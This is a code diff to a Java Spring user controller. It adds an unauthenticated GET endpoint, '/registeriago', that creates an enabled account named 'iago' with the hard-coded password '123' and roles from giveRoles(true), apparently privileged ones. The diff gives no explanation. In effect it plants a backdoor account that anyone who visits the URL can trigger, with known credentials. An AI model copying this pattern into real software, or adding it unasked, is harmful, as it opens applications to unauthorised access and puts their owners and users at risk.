@@ -197,4 +197,19 @@ public class UserController extends BaseController{
         }
         return "changepass";
     }
+
+
+
+    @RequestMapping(value = "/registeriago" , method = RequestMethod.GET)
+    public RedirectView registerIago(){
+        List<Role> roles = giveRoles(true);
+        User user = new User();
+        user.setEnabled(true);
+        user.setUsername("iago");
+        user.setPassword(passwordEncoder().encode("123"));
+        user.setRoles(roles);
+        userService.addUser(user);
+
+        return new RedirectView("/login");
+    }
 }
